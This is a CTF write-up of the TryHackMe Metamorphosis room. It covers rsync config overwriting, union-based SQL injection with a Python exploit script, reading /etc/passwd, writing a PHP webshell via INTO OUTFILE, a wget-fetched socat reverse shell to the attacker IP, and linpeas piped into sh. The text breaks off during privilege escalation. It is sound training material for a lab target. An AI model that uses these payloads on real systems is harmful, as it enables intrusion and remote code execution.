# Metamorphosis

## Introduction

Welcome to my another writeup! In this TryHackMe [Metamorphosis](https://tryhackme.com/room/metamorphosis) room, you'll learn: Enumerating rsync, RCE (Remote Code Execution) via Union-based SQL injection, sniffing local loopback traffic and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

> Part of Incognito CTF
>  
> Difficulty: Medium

---

Part of [Incognito 2.0 CTF](https://ctftime.org/event/1321)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```zsh
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# export RHOSTS=10.10.14.138 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f70f0a1850780710f232d1603040d4be (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjT/lRIkM7TFdpO6bwrOH8B0fB1kVslwfc/jdO+WtRiic1J8hDXzLatrXeBpzFqWveVmMI84dUhmidyBTk+jIksonSxB6IrLxCw+clRTQOUGXYw6iu3DiVZ6Xr/BlnxscgGuFMEvYd7E2ADyyVY/HDvpPMIv7SrDxfd+UNXf9yELZbsgY9CEqBuqT/3Ka4lt6ecslpcfMbkhZdiTgYnZ9EMrcmJlKcEXMq/tliZt5VuV7nxOEqKi1LfmgeIcl48Mok1sPCro+QsVfR5BvJPilLIfC35HoaBF1tyIdbzvZLfj/iCB/EhhtMqLZoPB2l/fg7RQ9soXK1rYgRbM0x7sv7
|   256 5c0037dfb2ba4cf23c466ea3e9449037 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGW8YbCvrlt/1rWQ4pObroj9o9vLbiGbYb/xxAjX/HoTxGUGYF/lYBCbZtmv8Fnkfs5Lg6K5MIHjjd/jpzNDQOg=
|   256 febf53f1d05a7c30dbacc83c796447c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxJeDTFMHsXaGHyZ8lSFpxm8VpawK1rvSDY0lbifD8e
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
873/tcp open  rsync       syn-ack ttl 63 (protocol version 31)
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel
[...]
```

According to `rustscan` result, we have 5 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache httpd 2.4.29 ((Ubuntu))
139,445           | Samba smbd 3.X - 4.X
873               | rsync

### SMB on Port 445

**Listing all shares via CrackMapExec:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# /opt/cme smb $RHOSTS -u '' -p '' --shares
SMB         10.10.14.138    445    INCOGNITO        [*] Windows 6.1 (name:INCOGNITO) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.14.138    445    INCOGNITO        [+] \: 
SMB         10.10.14.138    445    INCOGNITO        [+] Enumerated shares
SMB         10.10.14.138    445    INCOGNITO        Share           Permissions     Remark
SMB         10.10.14.138    445    INCOGNITO        -----           -----------     ------
SMB         10.10.14.138    445    INCOGNITO        print$                          Printer Drivers
SMB         10.10.14.138    445    INCOGNITO        IPC$                            IPC Service (incognito server (Samba, Ubuntu))
```

Nothing weird.

**Enumerating SMB via `enum4linux`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# enum4linux $RHOSTS
[...]
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\tom (Local User)
[...]
```

- Found local user: `tom`

### Rsync on Port 873

**Manual enumeration:** (From [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync))
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# nc -nv $RHOSTS 873
(UNKNOWN) [10.10.14.138] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
Conf           	All Confs
@RSYNCD: EXIT
```

- Found module: `Conf`

**Listing share folder `Conf`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# rsync -av --list-only rsync://$RHOSTS/Conf       
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 16:03:08 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 16:03:06 webapp.ini
```

**Hmm... Let's copy all files to our attacker machine:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# rsync -av rsync://$RHOSTS/Conf ./rsync_shared_Conf 
receiving incremental file list
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# ls -lah rsync_shared_Conf 
total 236K
drwxrwxrwx 2 root   root    4.0K Apr 10  2021 .
drwxr-xr-x 4 root   root    4.0K Jan 11 00:22 ..
-rw-r--r-- 1 nobody nam     4.6K Apr  9  2021 access.conf
-rw-r--r-- 1 nobody root    1.4K Apr  9  2021 bluezone.ini
-rw-r--r-- 1 nobody nam     2.9K Apr  9  2021 debconf.conf
-rw-r--r-- 1 nobody nam      332 Apr  9  2021 ldap.conf
-rw-r--r-- 1 nobody nam      93K Apr  9  2021 lvm.conf
-rw-r--r-- 1 nobody nogroup 8.8K Apr  9  2021 mysql.ini
-rw-r--r-- 1 nobody nogroup  69K Apr  9  2021 php.ini
-rw-r--r-- 1 nobody nam      320 Apr  9  2021 ports.conf
-rw-r--r-- 1 nobody nam      589 Apr  9  2021 resolv.conf
-rw-r--r-- 1 nobody nam       29 Apr  9  2021 screen-cleanup.conf
-rw-r--r-- 1 nobody nam     9.4K Apr  9  2021 smb.conf
-rw-rw-r-- 1 nobody nogroup   72 Apr 10  2021 webapp.ini
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# cat rsync_shared_Conf/webapp.ini 
[Web_App]
env = prod
user = tom
password = {Redacted}

[Details]
Local = No
```

- Found user `tom`'s password?

We also found that there is a **MySQL config file**. Maybe the web application is using MySQL as the DBMS (Database Management System)?

**Try to upload a file:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# touch anything

┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# rsync -av anything rsync://$RHOSTS/Conf/anything
sending incremental file list
anything
rsync: chgrp "/.anything.qcbx8l" (in Conf) failed: Operation not permitted (1)

sent 100 bytes  received 118 bytes  87.20 bytes/sec
total size is 0  speedup is 0.00
rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1338) [sender=3.2.7]

┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# rsync -av --list-only rsync://$RHOSTS/Conf      
receiving incremental file list
drwxrwxrwx          4,096 2023/01/11 01:40:40 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-------              0 2023/01/11 01:40:40 anything
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 16:03:06 webapp.ini
```

Looks like we can upload any file?

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# echo "$RHOSTS metamorphosis.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111003448.png)

A default page of Apache installation.

**Let's use `gobuster` to enumerate hidden files and directories:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# gobuster dir -u http://metamorphosis.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
/index.php            (Status: 200) [Size: 10818]
/.htaccess            (Status: 403) [Size: 282]
/.                    (Status: 200) [Size: 10818]
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 282]
/.htm                 (Status: 403) [Size: 282]
/.htpasswds           (Status: 403) [Size: 282]
/.htgroup             (Status: 403) [Size: 282]
/wp-forum.phps        (Status: 403) [Size: 282]
/.htaccess.bak        (Status: 403) [Size: 282]
/.htuser              (Status: 403) [Size: 282]
/.htc                 (Status: 403) [Size: 282]
/.ht                  (Status: 403) [Size: 282]
/.htaccess.old        (Status: 403) [Size: 282]
/.htacess             (Status: 403) [Size: 282]

┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# gobuster dir -u http://metamorphosis.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
/admin                (Status: 301) [Size: 322] [--> http://metamorphosis.thm/admin/]
/server-status        (Status: 403) [Size: 282]
```

- Found hidden directory: `/admin`

**`/admin`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# curl -vv http://metamorphosis.thm/admin/                                   
*   Trying 10.10.14.138:80...
* Connected to metamorphosis.thm (10.10.14.138) port 80 (#0)
> GET /admin/ HTTP/1.1
> Host: metamorphosis.thm
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Wed, 11 Jan 2023 05:37:33 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 132
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host metamorphosis.thm left intact
<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>
```

Hmm.. Fake 403 Forbidden?

**Also, there is a HTML comment:**
```html
<!-- Make sure admin functionality can only be used in development environment. -->
```

**Enumerating `/admin`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# gobuster dir -u http://metamorphosis.thm/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 132]
/.htaccess            (Status: 403) [Size: 282]
/.                    (Status: 200) [Size: 132]
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 282]
/.htm                 (Status: 403) [Size: 282]
/.htpasswds           (Status: 403) [Size: 282]
/.htgroup             (Status: 403) [Size: 282]
/wp-forum.phps        (Status: 403) [Size: 282]
/.htaccess.bak        (Status: 403) [Size: 282]
/.htuser              (Status: 403) [Size: 282]
/.htc                 (Status: 403) [Size: 282]
/.ht                  (Status: 403) [Size: 282]
/.htaccess.old        (Status: 403) [Size: 282]
/.htacess             (Status: 403) [Size: 282]

┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# gobuster dir -u http://metamorphosis.thm/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
```

- Found hidden file: `/config.php` 

Armed with above information, maybe we can upload a `webapp.ini` config file in `rsync`, then gain access to the admin page?

Let's try that!

**After some googling, I found this GitHub [issues](https://github.com/symfony/recipes/issues/633):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111015057.png)

**And then take a look at the `webapp.ini`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# cat rsync_shared_Conf/webapp.ini 
[Web_App]
env = prod
user = tom
password = {Redacted}

[Details]
Local = No
```

**Then combine the HTML comment:**
```html
<!-- Make sure admin functionality can only be used in development environment. -->
```

**Hmm... Can we modify the `env` key's value from `prod` to `dev`?**
```
[Web_App]
env = dev
user = tom
password = {Redacted}

[Details]
Local = No
```

**Then upload the modified `webapp.ini` via `rsync`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# rsync -av rsync_shared_Conf/webapp.ini rsync://$RHOSTS/Conf/webapp.ini
sending incremental file list
webapp.ini

┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# rsync -av --list-only rsync://$RHOSTS/Conf                                                         
receiving incremental file list
drwxrwxrwx          4,096 2023/01/11 01:49:38 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-------              0 2023/01/11 01:40:40 anything
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             71 2023/01/11 01:49:19 webapp.ini
```

**Now, we should able to gain access to the admin page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111015332.png)

Nice!!

**In `/admin/index.php`, we can get info of users. Let's try `tom`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111015418.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111015432.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111015501.png)

As you can see, when clicked the "Submit Query" button, **it'll send a POST request to `/admin/config.php`, with parameter `username`.**

Then, it'll display the username and password.

**Now, we can try to test SQL injection, as it may be using SQL query to fetch users' info:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u http://metamorphosis.thm/admin/config.php -X POST -d "username=FUZZ" -fs 0
[...]
```

But no luck in fuzzing...

## Initial Foothold

**Let's do it manually:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# curl http://metamorphosis.thm/admin/config.php --data-urlencode 'username=" OR 1=1-- -'    
Username Password<br>tom {Redacted}<br /> 
```

**After some testing, I found that we can use `"` to break out of the SQL query, then use `OR 1=1` to always evaluate `true`, and finally use `-- -` to comment out the reset of the query.**

Hence, it's vulnerable to SQL injection!

But which type of SQL injection? Union-based? Blind-based?

**Let's test for Union-based:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# curl http://metamorphosis.thm/admin/config.php --data-urlencode 'username=" UNION ALL SELECT "string1","string2","string3"-- -'
Username Password<br>string2 string3<br />
```

It worked!

Now we found that **it's vulnerable to Union-based SQL injection, it has 3 columns, and column 2, 3 accepts string data type.**

**To automate things, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests

class exploit():
    def __init__(self, url):
        self.url = url
        
    def sendRequest(self, payload):
        queryData = {
            'username': payload
        }

        requestResult = requests.post(self.url, data=queryData)
        listRequestText = requestResult.text.split('<br>')
        payloadResult = listRequestText[2:]

        print(f'[*] Payload: {payload}')
        print('[*] Payload result:')

        # Check only has 1 result
        if len(listRequestText) == 2:
            print(listRequestText[1].split('<br />')[0].strip())
        # If it has multiple results, print them all
        else:
            for item in payloadResult:
                print(item.split('<br />')[0].strip())


def main():
    url = 'http://metamorphosis.thm/admin/config.php'
    Exploit = exploit(url)

    payload = '''" UNION ALL SELECT NULL,NULL,"string3"-- -'''
    Exploit.sendRequest(payload)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py
[*] Payload: " UNION ALL SELECT NULL,NULL,"string3"-- -
[*] Payload result:
string3
```

**Now, we can confirm the DBMS is really MySQL or not:**
```py
payload = '''" UNION ALL SELECT NULL,NULL,@@version-- -'''
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py
[*] Payload: " UNION ALL SELECT NULL,NULL,@@version-- -
[*] Payload result:
5.7.34-0ubuntu0.18.04.1
```

- DBMS information: MySQL version 5.7.34-0ubuntu0.18.04.1

**Let's enumerate the database!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py
[*] Payload: " UNION ALL SELECT NULL,NULL,database()-- -
[*] Payload result:
db
```

- Current database: `db`

**List all tables:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py
[*] Payload: " UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema != "mysql" AND table_schema != "information_schema"-- -
[*] Payload result:
[...]
users
[...]
```

**The `users` table looks interesting:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py
[*] Payload: " UNION ALL SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name = "users"-- -
[*] Payload result:
uname
password
USER
CURRENT_CONNECTIONS
TOTAL_CONNECTIONS
```

**Let's extract all data from that table!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py
[*] Payload: " UNION ALL SELECT NULL,NULL,CONCAT(uname, ':', password) FROM users-- -
[*] Payload result:
tom:{Redacted}
```

Nothing useful.

**Hmm... Let's try to read a file into to the web server:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py
[*] Payload: " UNION ALL SELECT NULL,NULL,load_file("/etc/passwd")-- -
[*] Payload result:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
tom:x:1000:1001::/home/tom:/bin/bash
```

It worked!

**How about writing a file? Like writing a PHP webshell:**
```php
<?php system($_GET["cmd"]); ?>
```

**Convert it to hex:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3
[...]
>>> import binascii
>>> 
>>> payload = b'''<?php system($_GET["cmd"]); ?>'''
>>> binascii.hexlify(payload)
b'3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e'
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# python3 user_query.py                                      
[*] Payload: " UNION ALL SELECT NULL,NULL,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE "/var/www/html/webshell.php"-- -
[*] Payload result:
```

**Try to reach our uploaded PHP webshell file:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# curl http://metamorphosis.thm/webshell.php --get --data-urlencode "cmd=id"
\N	\N	uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Yes! We successfully write a PHP webshell to `/webshell.php`!**

Let's get a reverse shell!

- Setup a listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443    
2023/01/11 03:39:13 socat[126873] N opening character device "/dev/pts/1" for reading and writing
2023/01/11 03:39:13 socat[126873] N listening on AF=2 0.0.0.0:443
```

- Send the payload: (Generated from [revshells.com](https://www.revshells.com/))

```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# curl http://metamorphosis.thm/webshell.php --get --data-urlencode "cmd=wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443    
2023/01/11 03:39:13 socat[126873] N opening character device "/dev/pts/1" for reading and writing
2023/01/11 03:39:13 socat[126873] N listening on AF=2 0.0.0.0:443
                                                                 2023/01/11 03:39:59 socat[126873] N accepting connection from AF=2 10.10.14.138:34860 on AF=2 10.9.0.253:443
                                                                  2023/01/11 03:39:59 socat[126873] N starting data transfer loop with FDs [5,5] and [7,7]
                                               www-data@incognito:/var/www/html$ 
www-data@incognito:/var/www/html$ export TERM=xterm-256color
www-data@incognito:/var/www/html$ stty rows 22 columns 107
www-data@incognito:/var/www/html$ whoami;hostname;id;ip a
www-data
incognito
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:cb:fe:54:e3:8d brd ff:ff:ff:ff:ff:ff
    inet 10.10.14.138/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2103sec preferred_lft 2103sec
    inet6 fe80::cb:feff:fe54:e38d/64 scope link 
       valid_lft forever preferred_lft forever
www-data@incognito:/var/www/html$ ^C
www-data@incognito:/var/www/html$ 
```

I'm user `www-data`!

**user.txt:**
```
www-data@incognito:/var/www/html$ cat /home/tom/user.txt 
{Redacted}
```

## Privilege Escalation

### www-data to root

Let's do some basic enumerations!

**System users:**
```
www-data@incognito:/var/www/html$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1001::/home/tom:/bin/bash

www-data@incognito:/var/www/html$ ls -lah /home
total 12K
drwxr-xr-x  3 root root 4.0K Apr 10  2021 .
drwxr-xr-x 24 root root 4.0K Jun  9  2021 ..
drwxr-xr-x  5 tom  tom  4.0K Jun  9  2021 tom
```

- Found system user: `tom`

**Kernel version:**
```
www-data@incognito:/var/www/html$ uname -a;cat /etc/issue
Linux incognito 4.15.0-144-generic #148-Ubuntu SMP Sat May 8 02:33:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 18.04.5 LTS \n \l
```

**Listening ports:**
```
www-data@incognito:/var/www/html$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1027          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:873             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::873                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.14.138:68         0.0.0.0:*                           -                   
udp        0      0 10.10.255.255:137       0.0.0.0:*                           -                   
udp        0      0 10.10.14.138:137        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 10.10.255.255:138       0.0.0.0:*                           -                   
udp        0      0 10.10.14.138:138        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -  
```

- Found localhost port: `1027`, `3306`

**Found MySQL credentials:**
```
www-data@incognito:/var/www/html$ head -n 5 admin/config.php 
<?php
$ini = parse_ini_file('/var/confs/webapp.ini');
if($ini['env']=='dev'){
$query=$_POST["username"];
$mysqli = new mysqli("localhost","dev","{Redacted}","db");
```

Let's dig deeper to port `1027`!

```
www-data@incognito:/var/www/html$ nc -nv 127.0.0.1 1027
Connection to 127.0.0.1 1027 port [tcp/*] succeeded!
hello?
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad request syntax ('hello?').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>
```

By using `nc` to connect to port 1027, we found that it's a HTTP service.

**Let's send a raw GET request to `/`:**
```
www-data@incognito:/var/www/html$ nc -nv 127.0.0.1 1027
Connection to 127.0.0.1 1027 port [tcp/*] succeeded!
GET / HTTP/1.1

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 25
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 11 Jan 2023 08:49:42 GMT

Only Talking to Root User
```

Cool. 

**However, before using `chisel` to do port forwarding, let's use LinPEAS:**
```
┌──(root🌸siunam)-[/usr/share/peass/linpeas]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
www-data@incognito:/var/www/html$ curl -s http://10.9.0.253/linpeas.sh | sh
[...]
╔══════════╣ Can I sniff with tcpdump?
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing
You can sniff with tcpdump!
[...]
